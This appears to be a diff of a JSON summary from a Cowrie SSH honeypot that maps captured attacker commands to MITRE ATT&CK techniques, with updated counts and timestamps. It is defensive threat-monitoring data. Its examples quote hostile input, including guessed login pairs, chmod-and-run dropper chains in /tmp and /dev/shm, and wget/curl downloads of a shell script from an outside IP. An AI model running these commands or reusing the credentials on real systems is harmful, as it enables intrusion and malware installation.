@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-09-27 05:02:45",
+  "generated": "2026-09-27 06:03:45",
   "totals": {
-    "commands": 1003,
-    "login_failed": 1477,
-    "login_success": 91,
-    "sessions": 1672
+    "commands": 1093,
+    "login_failed": 1599,
+    "login_success": 99,
+    "sessions": 1809
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 1477,
+      "count": 1599,
       "examples": [
         "mongo / 1qaz@WSX",
         "gitlab-runner / qwerty",
@@ -21,14 +21,14 @@
         "admin / admin"
       ],
       "first": "2026-09-27T00:00:14.493551Z",
-      "last": "2026-09-27T05:02:15.481779Z",
-      "unique_ips": 42
+      "last": "2026-09-27T06:02:33.470150Z",
+      "unique_ips": 49
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 414,
+      "count": 439,
       "examples": [
         ">/var/.f && chmod 777 /var/.f && /var/.f && cd /var/;",
         ">/var/tmp/.f && chmod 777 /var/tmp/.f && /var/tmp/.f && cd /var/tmp/;",
@@ -37,14 +37,14 @@
         ">/dev/shm/.f && chmod 777 /dev/shm/.f && /dev/shm/.f && cd /dev/shm/;"
       ],
       "first": "2026-09-27T00:03:01.683614Z",
-      "last": "2026-09-27T04:47:28.787416Z",
-      "unique_ips": 20
+      "last": "2026-09-27T05:23:06.456929Z",
+      "unique_ips": 22
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 91,
+      "count": 99,
       "examples": [
         "root / root",
         "enable / linuxshell",
@@ -53,8 +53,8 @@
         "root / 1234"
       ],
       "first": "2026-09-27T00:02:58.504576Z",
-      "last": "2026-09-27T04:47:24.251586Z",
-      "unique_ips": 29
+      "last": "2026-09-27T06:00:29.571930Z",
+      "unique_ips": 34
     },
     {
       "id": "T1082",
@@ -76,7 +76,7 @@
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 24,
+      "count": 36,
       "examples": [
         "cd /tmp;rm -rf wget.sh; wget http://202.110.70.60:800/wget.sh; busybox wget http://202.110.70.60:800/wget.sh; curl -O ht",
         "http://202.110.70.60:800/wget.sh",
@@ -85,22 +85,23 @@
         "for pid in /proc/[0-9]*; do pid_num=\"${pid##*/}\"; if [ -r \"$pid/maps\" ]; then suspicious=true; while IFS= read -r line; "
       ],
       "first": "2026-09-27T02:39:43.674112Z",
-      "last": "2026-09-27T04:47:45.646564Z",
-      "unique_ips": 10
+      "last": "2026-09-27T05:23:06.456929Z",
+      "unique_ips": 12
     },
     {
       "id": "T1033",
       "name": "System Owner/User Discovery",
       "tactic": "Discovery",
-      "count": 13,
+      "count": 14,
       "examples": [
         "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || ",
         "w",
-        "whoami"
+        "whoami",
+        "id"
       ],
       "first": "2026-09-27T04:21:40.574624Z",
-      "last": "2026-09-27T04:48:02.755548Z",
-      "unique_ips": 7
+      "last": "2026-09-27T05:23:05.061882Z",
+      "unique_ips": 8
     },
     {
       "id": "T1057",
@@ -184,6 +185,18 @@
       "unique_ips": 2
     },
     {
+      "id": "T1087.001",
+      "name": "Account Discovery: Local Account",
+      "tactic": "Discovery",
+      "count": 1,
+      "examples": [
+        "cat /etc/passwd"
+      ],
+      "first": "2026-09-27T05:23:05.066658Z",
+      "last": "2026-09-27T05:23:05.066658Z",
+      "unique_ips": 1
+    },
+    {
       "id": "T1095",
       "name": "Non-Application Layer Protocol",
       "tactic": "Command and Control",
@@ -199,34 +212,38 @@
   "unmapped": [
     [
       "/bin/busybox HISILICON",
-      99
+      105
     ],
     [
       "system",
-      69
+      75
     ],
     [
       "sh",
-      68
+      74
     ],
     [
       "shell",
-      66
+      72
     ],
     [
       "enable",
-      66
+      72
     ],
     [
       "ping; sh",
-      66
+      70
     ],
     [
       "/bin/busybox cat /proc/self/exe || cat /proc/self/exe",
-      33
+      35
     ],
     [
       "<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">\n<html><head>\n<title>404 Not Found</title>\n</head><body>\n<h1>Not Found",
+      3
+    ],
+    [
+      "/bin/busybox",
       3
     ],
     [
@@ -271,10 +288,6 @@
     ],
     [
       "python3 /tmp/bendi.py",
-      1
-    ],
-    [
-      "rm /tmp/bendi.py",
       1
     ]
   ]
